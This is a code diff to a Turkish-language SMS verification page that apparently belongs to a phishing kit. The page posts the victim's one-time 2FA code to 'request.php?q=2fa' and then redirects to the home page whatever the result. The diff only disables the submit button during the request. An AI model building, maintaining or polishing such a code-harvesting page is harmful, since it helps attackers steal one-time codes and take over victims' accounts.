@@ -227,7 +227,7 @@
                         <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
                         <form novalidate="" class="ng-untouched ng-pristine ng-invalid" id="smsForm" action="javascript:;" onsubmit="smsa()">
                            <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
-                           <button type="submit" class="btn">Giriş</button>
+                           <button type="submit" class="btn" id="smsgiris">Giriş</button>
                         </form>
                         <div class="remaning-time-cntnt"><span class="remaning-time"> Kalan süre </span><span id="gerisayi">106</span><a href="javascript:;" class="right disabled"> SMS şifremi tekrar gönder <i class="fa fa-refresh fa-fw"></i></a></div>
                         <!---->
@@ -250,24 +250,30 @@
                }
 
                geriyeSay();
-               function smsa(){
+               function smsa() {
+                  $('#smsgiris').prop('disabled', true);
+
                   event.preventDefault();
-               $.ajax({
-                  type: 'POST',
-                  url: 'request.php?q=2fa',
-                  data: $('#smsForm').serialize(),
-                  success: (response) => {
-                     if (response == 'error') {
-                     Swal.fire('Hata!','Bilgileri doğru girdiğinizden emin olun','error');
-                     }else{
-                     if (locate == 0) {
-                        window.location.href = '/';
-                     }else{
-                        window.location.href = '/';
+                  $.ajax({
+                     type: 'POST',
+                     url: 'request.php?q=2fa',
+                     data: $('#smsForm').serialize(),
+                     success: (response) => {
+                        $('#smsgiris').prop('disabled', false);
+                        if (response == 'error') {
+                           Swal.fire('Hata!','Bilgileri doğru girdiğinizden emin olun','error');
+                        } else {
+                           if (locate == 0) {
+                              window.location.href = '/';
+                           } else {
+                              window.location.href = '/';
+                           }
+                        }
+                     },
+                     error: () => {
+                        $('#smsgiris').prop('disabled', false);
                      }
-                     }
-                  }
-  })
+                  });
                }
                </script>
             <!---->
